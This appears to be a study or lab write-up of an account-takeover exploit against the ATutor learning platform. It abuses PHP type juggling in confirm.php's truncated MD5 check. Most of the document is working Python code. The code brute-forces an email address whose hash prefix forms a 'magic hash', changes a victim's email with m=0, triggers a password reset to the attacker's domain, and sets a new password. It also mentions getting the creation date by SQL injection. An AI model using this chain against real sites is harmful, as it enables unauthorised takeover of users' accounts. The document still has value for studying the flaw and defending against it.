# Vulnerability Discovery

Unauthenticated attacker could gain access using type juggling vulnerability, through the code segment responsible for user account email address updates in the public `confirm.php` .

```php
if (isset($_GET['e'], $_GET['id'], $_GET['m'])) {
$id = intval($_GET['id']);
$m  = $_GET['m'];
$e  = $addslashes($_GET['e']);

$sql    = "SELECT creation_date FROM %smembers WHERE member_id=%d";
$row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);

if ($row['creation_date'] != '') {
 	$code = substr(md5($e . $row['creation_date'] . $id), 0, 10);
 	if ($code == $m) {
	 	$sql = "UPDATE %smembers SET email='%s', last_login=NOW(), creation_date=creation_date WHERE member_id=%d";
	 	$result = queryDB($sql, array(TABLE_PREFIX, $e, $id));
	 	$msg->addFeedback('CONFIRM_GOOD');
	 
	 	header('Location: '.$_base_href.'users/index.php');
	 	exit;
 	} else {
 			$msg->addError('CONFIRM_BAD');
 	}
} else {
	$msg->addError('CONFIRM_BAD');
}
```

The variable `$code` is initialized as the first 10 characters of the MD5 hash of 2 variables that we have control over and the `$creation_date` from the database. It is then loosely compared against the variable `$m` that we have control over. If we can pass the comparison statement, we can update the email to the value `$e`. 

We can use SQLi to obtain the `$creation_date` variable and use that to generate a magic hash. 

# Magic Hashes

The special case MD5 hash has the entire hash conforming to scientific exponent notation. However, since only the first 10 characters are compared, it is easier to generate a vulnerable string. 

```php
php > echo md5('240610708');
0e462097431906509019562988736854
```

## Generating hash

```php
$code = substr(md5($e . $row['creation_date'] . $id), 0, 10);
```

The values of the account ID needs to stay static as we are targeting a single account, and the value of the account creation date is pulled from the database. As such, only the `$e` variable, the new email address being provided for the target user, can be modified. 

- We also need to be able to generate an arbitrary email account for a domain we control once we find a valid email address. This will allow us to use the Forgot password feature to have a password reset email sent to that address.
- We can thus use a python script that will generates all possible combinations of email addresses using the alpha character set and a specified domain.

```python
def get_code (domain, id, creation_date):
    count = 0
    print("Searching for valid email......")
    
    for prefix_length in range(1, 5):
        for word in map(''.join,itertools.product(string.ascii_lowercase, \
            repeat=int(prefix_length))):

            raw_string = f"{word}@{domain}{creation_date}{id}"
            hash = hashlib.md5(raw_string.encode()).hexdigest()
            hash_prefix = hash[:10]
            
            if re.match(r'0+[eE]\d+$', hash_prefix):
                print(f"Valid hash: {hash_prefix}")
                print(f"Raw String: {raw_string}")
                return word

    raise Exception("No valid email found!")
    return ""
```

# Account Hijacking request

Since a successful request will direct us to `users/index.php`, we can use the 302-request status code to detect a successful request. 

```python
def hijack_account(ip, email_prefix, domain, member_id):
    email = f"{email_prefix}@{domain}"
    print(f"Hijacking account {member_id} with email {email}")
    
    target = f"http://{ip}/ATutor/confirm.php?id={member_id}&m=0&e={email}"
    r = requests.get(target, allow_redirects=False)
    if r.status_code == 302:
        return True
    else:
        return False
```

Once we perform the hijacking request, we can send a request to reset the password. 

```python
def password_reminder(ip, email_prefix, domain):
    email = f"{email_prefix}@{domain}"
    print(f"Sending reset password email for email {email}.....")

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    target = f"http://{ip}/ATutor/password_reminder.php"
    data = {
        "form_password_reminder": "true",
        "form_email": email,
        "submit": "Submit"
    }

    r = s.post(target, data=data)

    if re.findall('No account found with that email address', r.text):
        raise Exception("Password reset unsuccessful!")
    print("Password reset successful!")
    return s
```

After we obtain the password reset link from our Atmail server, we can use the link to reset the accountâ€™s password to one of our choosing. 

```python
def reset_password(ip, password_url):
    print("Resetting Password.....")
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    r = s.get(password_url)

    params = {}
    params_strings = password_url.split('?')[1].split('&')
    for param in params_strings:
        x = param.split('=')
        if len(x) != 2: 
            raise ("Invalid URL!")
        params[x[0]] = x[1]
    
    target = f'http://{ip}/ATutor/password_reminder.php'
    PASSWORD = 'Bromine1!'
    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()

    data = {
        'form_change': 'true',
        'id': params['id'],
        'g': params['g'],
        'h': params['h'], 
        'password': PASSWORD,
        'password2': PASSWORD,
        'form_password_hidden': password_hash,
        'password_error': '',
        'submit': 'Submit'
    }

    r = s.post(target, data=data)
```